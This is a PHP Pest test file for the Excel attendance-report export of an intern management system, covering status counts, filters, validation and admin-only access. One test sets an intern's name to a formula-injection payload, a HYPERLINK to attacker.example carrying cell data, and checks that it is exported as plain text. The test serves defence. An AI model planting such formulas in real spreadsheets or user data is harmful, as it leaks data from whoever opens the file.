<?php

use App\Models\Attendance;
use App\Models\AuditLog;
use App\Models\LeaveRequest;
use App\Models\User;
use Illuminate\Support\Carbon;
use Illuminate\Testing\TestResponse;
use OpenSpout\Reader\XLSX\Reader;

beforeEach(function () {
    $this->travelTo(Carbon::parse('2026-10-12 10:00:00'));

    $this->admin = User::factory()->admin()->create(['name' => 'Admin Sinta']);
    $this->sari = User::factory()->mentor()->create(['name' => 'Sari Wijaya']);
    $this->budiMentor = User::factory()->mentor()->create(['name' => 'Budi Santoso']);
    $this->rina = reportIntern($this->sari, 'Rina Wulandari');
});

function reportIntern(User $mentor, string $name, array $profile = [], array $attributes = []): User
{
    return User::factory()->intern([
        'mentor_id' => $mentor->id,
        'start_date' => '2026-09-01',
        'end_date' => '2026-12-31',
        ...$profile,
    ])->create(['name' => $name, ...$attributes]);
}

function exportReport(User $user, array $data): TestResponse
{
    app('auth')->forgetGuards();

    return test()->postJson('/api/admin/reports/export', $data, ['Authorization' => 'Bearer '.$user->createToken('api')->plainTextToken]);
}

/**
 * @return list<list<mixed>>
 */
function xlsxRows(TestResponse $response): array
{
    $reader = new Reader;
    $reader->open($response->baseResponse->getFile()->getPathname());
    $rows = [];

    foreach ($reader->getSheetIterator() as $sheet) {
        foreach ($sheet->getRowIterator() as $row) {
            $rows[] = $row->toArray();
        }
        break;
    }

    $reader->close();

    return $rows;
}

/**
 * @return list<list<mixed>>
 */
function tableRows(array $rows, string $firstHeader): array
{
    $header = array_search($firstHeader, array_column($rows, 0), true);

    return array_slice($rows, $header + 1);
}

describe('rekap absensi', function () {
    it('counts final statuses per intern in the period, with late and corrected days', function () {
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-05', 'clock_in_at' => '07:55:00']);
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-06', 'clock_in_at' => '08:15:00']);
        Attendance::factory()->for($this->rina, 'intern')->clockedIn()->create(['date' => '2026-10-07', 'clock_in_at' => '08:30:00']);
        LeaveRequest::factory()->for($this->rina, 'intern')->approved()->create(['start_date' => '2026-10-08', 'end_date' => '2026-10-08']);
        Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-12', 'clock_in_at' => '09:00:00']);

        reportIntern($this->budiMentor, 'Andi Pratama');
        reportIntern($this->sari, 'Sudah Selesai', ['start_date' => '2026-07-01', 'end_date' => '2026-09-30']);
        reportIntern($this->sari, 'Belum Mulai', ['start_date' => '2026-10-12']);

        $response = exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-05', 'to' => '2026-10-12', 'mentor_id' => $this->sari->id])
            ->assertOk()
            ->assertDownload('rekap-absensi_2026-10-05_2026-10-12.xlsx');

        expect($response->headers->get('Content-Type'))->toBe('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');

        $rows = xlsxRows($response);

        expect(array_column(array_slice($rows, 0, 6), 0))->toBe([
            'InJourney Airports - Intern Management & Attendance System',
            'Rekap Absensi',
            'Periode: 5 Okt 2026 - 12 Okt 2026',
            'Intern: Semua | Mentor: Sari Wijaya',
            'Dibuat: 12 Okt 2026 10:00 oleh Admin Sinta',
            'Hari ini belum dihitung karena status final ditetapkan setelah 23:59.',
        ])->and(tableRows($rows, 'Intern'))->toBe([
            ['Rina Wulandari', 'Sari Wijaya', 2, 1, 0, 1, 1, 1, 0, 5],
        ]);

        expect(AuditLog::sole()->only(['action', 'object', 'detail']))->toBe([
            'action' => 'Laporan',
            'object' => 'Rekap Absensi',
            'detail' => 'Export Excel 5 Okt 2026 - 12 Okt 2026, mentor Sari Wijaya.',
        ]);
    });

    it('filters by intern and leaves out interns without working days in the period', function () {
        $andi = reportIntern($this->budiMentor, 'Andi Pratama');

        $rows = xlsxRows(exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09', 'intern_id' => $andi->id])->assertOk());

        expect(tableRows($rows, 'Intern'))->toBe([['Andi Pratama', 'Budi Santoso', 0, 0, 0, 0, 7, 0, 0, 7]]);
    });

    it('tells the admin when there is no data', function () {
        exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-08-01', 'to' => '2026-08-31'])
            ->assertUnprocessable()
            ->assertJsonPath('reason', 'no_data')
            ->assertJsonPath('message', 'Tidak ada data pada periode ini.');

        expect(AuditLog::query()->count())->toBe(0);
    });
});

it('writes names as text, never as spreadsheet formulas', function () {
    $payload = '=HYPERLINK("https://attacker.example/?d="&A9,"Rina Wulandari")';
    $this->rina->update(['name' => $payload]);

    $response = exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09'])->assertOk();

    $zip = new ZipArchive;
    $zip->open($response->baseResponse->getFile()->getPathname());
    $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
    $zip->close();

    expect($sheet)->not->toContain('<f>')
        ->and(array_merge(...xlsxRows($response)))->toContain($payload);
});

it('validates the report form', function (array $data, string $field, string $message) {
    exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09', ...$data])
        ->assertUnprocessable()
        ->assertJsonValidationErrors([$field => $message]);
})->with([
    'tanpa jenis' => [['type' => null], 'type', 'Pilih jenis laporan.'],
    'rekap izin tidak ada' => [['type' => 'leaves'], 'type', 'Pilih jenis laporan.'],
    'rekap task sudah dihapus' => [['type' => 'tasks'], 'type', 'Pilih jenis laporan.'],
    'periode terbalik' => [['to' => '2026-09-30'], 'to', 'Periode tidak valid.'],
    'bukan intern' => [['intern_id' => 1], 'intern_id', 'Intern tidak ditemukan.'],
]);

it('offers every intern and mentor as filters, including inactive accounts', function () {
    User::factory()->mentor()->inactive()->create(['name' => 'Mentor Lama']);

    app('auth')->forgetGuards();
    test()->getJson('/api/admin/reports/options', ['Authorization' => 'Bearer '.$this->admin->createToken('api')->plainTextToken])
        ->assertOk()
        ->assertJsonPath('data.interns', [['id' => $this->rina->id, 'name' => 'Rina Wulandari']])
        ->assertJsonPath('data.mentors.*.name', ['Budi Santoso', 'Mentor Lama', 'Sari Wijaya'])
        ->assertJsonPath('data.mentors.1.is_active', false);
});

it('lets only admins export', function (string $role) {
    $actor = User::factory()->{$role}()->create();

    exportReport($actor, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09'])->assertForbidden();
})->with(['intern', 'mentor']);
